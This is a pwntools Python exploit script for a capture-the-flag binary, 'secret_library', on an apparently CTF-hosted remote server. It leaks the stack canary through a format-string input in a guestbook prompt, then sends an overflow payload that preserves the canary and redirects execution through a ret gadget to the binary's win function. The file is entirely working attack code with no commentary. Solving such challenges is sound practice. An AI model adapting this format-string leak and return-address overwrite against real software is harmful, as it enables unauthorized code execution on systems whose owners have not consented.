#!/usr/bin/env python3
from pwn import *

exe = ELF('secret_library', checksec=False)
context.binary = exe
context.os = 'linux'
context.arch = 'amd64'

HOST, PORT = 'offsec.m0lecon.it', 13530

CANARY_IDX = 23

OFFSET_TO_CANARY = 136
OFFSET_TO_RIP = OFFSET_TO_CANARY + 16

GADGET = 0x000000000040101a


def conn():
    if args.LOCAL:
        r = process(exe.path)
    else:
        r = remote(HOST, PORT)
    return r


def main():
    r = conn()

    r.recvuntil(b"Sign the guestbook: ")
    r.sendline(f'%{CANARY_IDX}$lx'.encode())

    leak = r.recvline().strip().split(b', ')
    canary = int(leak[1], 16)

    log.info(f'Canary: {canary:#x}')

    r.recvuntil(b'\nLeave a review: ')
    payload = flat(
        b'A' * OFFSET_TO_CANARY,
        p64(canary),
        b'B' * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
        p64(GADGET),
        p64(exe.sym.win)
    )
    r.send(payload)
    r.interactive()



if __name__ == '__main__':
    main()
